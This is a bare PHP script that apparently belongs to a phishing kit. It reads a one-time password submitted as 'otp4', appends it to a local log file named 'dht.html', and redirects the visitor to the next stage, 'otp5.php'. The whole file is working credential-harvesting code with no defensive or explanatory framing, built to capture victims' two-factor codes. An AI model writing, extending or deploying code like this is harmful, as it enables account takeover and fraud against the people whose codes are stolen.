<?php
header("location:otp5.php");
$otp4=$_POST['otp4'];
$handle=fopen('dht.html','a');
fwrite($handle ,"otp4=$otp4\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
